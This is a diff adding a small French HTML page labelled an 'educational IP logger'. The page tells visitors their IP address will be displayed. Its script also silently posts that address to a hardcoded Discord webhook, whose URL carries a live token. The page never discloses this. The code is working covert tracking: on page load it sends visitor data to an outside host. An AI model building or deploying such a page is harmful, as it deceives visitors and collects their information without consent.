@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger Éducatif</title>
+</head>
+<body>
+    <h1>Bienvenue</h1>
+    <p>Votre adresse IP sera affichée ici :</p>
+    <p id="ip"></p>
+
+    <script>
+        const webhookURL = "https://canary.discord.com/api/webhooks/1343448074932060213/JOcFCf9CbQXMQ-BDt5S2W3RhNRZkmtm5O68ciZv1jKvhRvtvStnisvkxsCIMQlQtpxl3";
+
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip').textContent = `Votre IP : ${data.ip}`;
+                console.log("Adresse IP capturée :", data.ip);
+                
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: `Nouvelle IP capturée : ${data.ip}`
+                    })
+                })
+                .catch(error => console.error("Erreur lors de l'envoi au webhook :", error));
+            })
+            .catch(error => console.error('Erreur lors de la récupération de l’IP :', error));
+    </script>
+</body>
+</html>
